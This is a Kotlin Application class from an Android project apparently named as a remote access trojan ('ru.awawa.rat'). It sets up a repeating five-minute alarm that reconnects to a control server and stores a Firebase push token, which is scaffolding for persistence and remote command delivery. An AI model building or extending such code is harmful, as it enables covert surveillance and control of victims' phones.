package ru.awawa.rat

import android.app.AlarmManager
import android.app.Application
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.SystemClock
import com.google.firebase.messaging.FirebaseMessaging
import ru.awawa.rat.helper.Preferences
import ru.awawa.rat.server.Interactor
import ru.awawa.rat.server.ServerConnectionAlarm

class Application: Application() {

    companion object {
        lateinit var context: Context
            private set

        fun scheduleReconnect() {
            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as? AlarmManager?
                ?: return

            val alarmIntent = Intent(context, ServerConnectionAlarm::class.java).let {
                PendingIntent.getBroadcast(
                    context,
                    101,
                    it,
                    PendingIntent.FLAG_CANCEL_CURRENT
                )
            }

            alarmManager.setRepeating(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.currentThreadTimeMillis() + 1000,
                300_000,
                alarmIntent
            )
        }

        fun cancelReconnect() {
            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as? AlarmManager?
                ?: return

            val alarmIntent = Intent(context, ServerConnectionAlarm::class.java).let {
                PendingIntent.getBroadcast(
                    context,
                    101,
                    it,
                    PendingIntent.FLAG_CANCEL_CURRENT
                )
            }

            alarmManager.cancel(alarmIntent)
        }
    }

    override fun onCreate() {
        super.onCreate()

        context = applicationContext
        Preferences.init(context)

        FirebaseMessaging.getInstance().token.addOnCompleteListener {
            Preferences.set(Preferences.PreferencesField.TOKEN, it.result ?: "")
        }
    }
}